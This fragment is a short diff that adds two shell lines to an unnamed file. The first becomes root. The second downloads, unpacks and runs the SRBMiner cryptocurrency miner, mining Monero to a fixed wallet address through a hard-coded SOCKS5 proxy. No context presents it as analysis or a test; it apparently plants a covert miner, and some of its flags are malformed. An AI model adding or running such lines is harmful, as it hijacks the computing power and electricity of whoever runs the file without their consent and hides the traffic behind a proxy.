@@ -1,0 +1,2 @@
+sudo su
+sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-7-1-Linux.tar.xz && cd SRBMiner-Multi-0-7-1 && ./SRBMiner-MULTI --disable-gpu--algorithm randomx --pool us.monero.herominers.com:1112 --wallet 8A2dMrR8WtpPJWCMYu1cUGa1HZvL3ixhiGpCEb9ncX3KBYz9DKsY9FN65GVGCaSjrEXhgPZoaz6MZ7NPGWoQ915wKLVsnGx --gpu bost 3 --proxy socks5://72.195.114.184:4145
